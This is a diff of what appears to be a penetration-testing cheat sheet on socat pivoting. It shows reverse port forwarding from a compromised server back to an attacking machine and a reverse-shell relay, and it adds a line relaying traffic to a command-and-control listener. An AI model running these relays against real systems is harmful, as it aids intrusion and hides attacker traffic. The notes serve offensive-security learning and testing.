@@ -174,6 +174,7 @@ socat tcp-l:33060,fork,reuseaddr tcp:$targetToForwardAddr:$ForwardedPort &
 socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
 # Reverse port forward from a compormised server back to  
 socat tcp:$AttackingMachine:8001 tcp:$targetToForwardAddr:$ForwardedPort,fork &
+
 ```
 
 Reverse Shell Relay 
@@ -181,6 +182,9 @@ Reverse Shell Relay
 # RemoteBox - create a listener that connects back to to the address of another box
 socat tcp-l:8000 tcp:$LocalBoxAddr:443 &
 # LocalBox has listen on port 443
+
+# For port reuse from some proxy to another listening C2/Server/etc 
+socat TCP-LISTEN:8000,reuseaddr,fork TCP:<destination_ip>:<destination_port>
 ```
 
 
